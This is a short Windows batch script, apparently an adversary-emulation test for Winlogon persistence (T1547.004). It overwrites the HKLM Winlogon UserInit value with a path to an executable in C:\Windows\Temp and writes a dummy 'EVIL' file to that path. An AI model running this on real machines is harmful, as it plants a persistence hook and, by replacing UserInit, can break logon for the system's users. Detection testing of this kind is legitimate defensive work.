@echo off
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\WinLogon" /v "UserInit" /t REG_SZ /d C:\Windows\Temp\T1547004001.exe /f
echo "EVIL" >> C:\Windows\Temp\T1547004001.exe